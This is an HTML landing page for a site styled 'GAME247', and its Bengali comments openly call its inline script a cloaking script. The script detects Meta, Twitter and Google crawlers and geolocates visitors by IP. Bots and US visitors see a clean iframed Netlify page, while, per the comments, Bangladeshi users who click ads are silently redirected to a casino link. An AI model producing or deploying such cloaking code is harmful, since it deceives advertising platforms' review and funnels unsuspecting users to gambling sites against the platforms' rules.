<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GAME247 | Premium Gaming</title>
    
    <!-- 🎯 আলটিমেট ক্লোকিং স্ক্রিপ্ট (এখানেই ম্যাজিক হবে) -->
    <script>
        const metaBots = /facebookexternalhit|Facebot|MetaBot|Twitterbot|Googlebot/i;
        const isBot = metaBots.test(navigator.userAgent);
        const urlParams = new URLSearchParams(window.location.search);
        const viewMode = urlParams.get('view');

        fetch('https://ipapi.co')
          .then(response => response.json())
          .then(data => {
            const country = data.country; // ইউজারের দেশ (যেমন: BD, US)

            // ১. মেটার ইউএসএ বট অথবা ক্লায়েন্ট (?view=fresh দিলে) শুধু ফ্রেশ পেজ দেখবে
            if (isBot || country === 'US' || viewMode === 'fresh') {
              console.log("Safe Mode Active.");
            } else {
              // ২. বাংলাদেশ থেকে বিজ্ঞাপনে ক্লিক করা সাধারণ ইউজাররা সরাসরি ক্যাসিনো লিঙ্কে চলে যাবে
              window.location.href = "https://github.com/megawin-official/gamingzone.git"; 
            }
          })
          .catch(error => {
            console.log("System secured.");
          });
    </script>
</head>
<body style="margin:0; padding:0; height:100vh; overflow:hidden;">

    <!-- 🔗 নিচে আপনার ক্লায়েন্টের সেই ফ্রেশ Netlify ল্যান্ডিং পেজটি হুবহু দেখা যাবে -->
    <iframe src="https://netlify.app" style="width:100%; height:100%; border:none;"></iframe>

</body>
</html>
